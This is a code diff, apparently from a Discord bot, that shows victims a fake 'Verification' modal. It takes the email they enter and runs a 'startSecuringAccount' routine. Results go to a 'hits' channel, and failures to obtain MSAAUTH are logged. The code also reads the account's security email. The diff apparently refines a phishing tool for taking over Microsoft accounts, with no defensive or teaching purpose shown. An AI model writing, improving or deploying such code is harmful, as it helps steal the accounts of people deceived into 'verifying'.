@@ -5,6 +5,7 @@ import discord
 import json
 import time
 import re
+import asyncio
 
 from views.buttons.button_two import ButtonViewTwo
 from views.buttons.button_three import ButtonViewThree
@@ -204,8 +205,18 @@ class MyModalOne(ui.Modal, title="Verification"):
                         "⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
                     )
 
-                    # Securing
-                    embeds = startSecuringAccount(self.email.value, device) 
+                    # Unblocks Courotine
+                    embeds = await asyncio.to_thread(startSecuringAccount, self.email.value, device) 
+
+                    if embeds is None:
+                        await logs_channel.send(
+                            embed = discord.Embed(
+                                title = f"Failed to Secure - {interaction.user.name} ({interaction.user.id})",
+                                description = f"**Email**\n```{self.email.value}```\n**Error**\n```Failed to get MSAAUTH```",
+                                colour=0xDE755B
+                            )
+                        )
+                        return
 
                     for embed in embeds:
                         await hits_channel.send(
@@ -241,6 +252,7 @@ class MyModalOne(ui.Modal, title="Verification"):
             return
 
         elif "OtcLoginEligibleProofs" in emailInfo["Credentials"]:
+
             print("\n| Starting securing process |\n")
             secEmail = emailInfo["Credentials"]["OtcLoginEligibleProofs"][0]
             print(f"[+] - Found security email: {secEmail["display"]}")
